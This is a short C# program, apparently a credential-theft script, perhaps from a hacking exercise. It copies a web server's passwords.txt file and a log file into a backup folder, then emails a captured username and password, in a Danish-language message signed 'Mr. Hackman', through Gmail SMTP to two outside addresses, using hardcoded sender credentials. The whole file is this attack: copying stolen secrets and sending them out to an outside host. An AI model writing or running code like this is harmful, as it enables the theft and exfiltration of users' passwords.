using System;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace Execute
{
    class Program
    {
        static void Main(string[] args)
        {
            BackupPasswords();
            SendMail(args[0], args[1]);
        }

        static void BackupPasswords()
        {
            string timeNow = DateTime.Now.ToFileTime().ToString();
            File.Copy("/var/www/html/data/passwords.txt", "/home/puppet/passwordbackups/" + timeNow + ".passwordbackup");
            File.Copy("/var/www/html/data/comprehensive_log.log", "/home/puppet/passwordbackups/" + timeNow + ".logbackup");
        }

        static void SendMail(string hackedUsername, string hackedPassword)
        {
            string from = "hackthisthing2@gmail.com";
            string fromPassword = "hackedlol";
            string host = "smtp.gmail.com";
            int port = 587;
            string subject = "Ny adgangskode";
            string body = 
                "Ny adgangskode registreret.\n" +
                $"Brugernavn:'{hackedUsername}'\n" +
                $"Adgangskode:'{hackedPassword}'\n" +
                "\n" +
                "Mvh.\n" +
                "\n" +
                "Mr. Hackman\n";

            SmtpClient smtp = new SmtpClient(host, port)
            {
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(from, fromPassword)
            };


            MailMessage hanne = new MailMessage(from, "hanneolsen69@gmail.com")
            {
                Subject = subject,
                Body = body
            };
            smtp.Send(hanne);

            MailMessage meo = new MailMessage(from, "meo96o3w@gmail.com")
            {
                Subject = subject,
                Body = body
            };
            smtp.Send(meo);
        }
    }
}
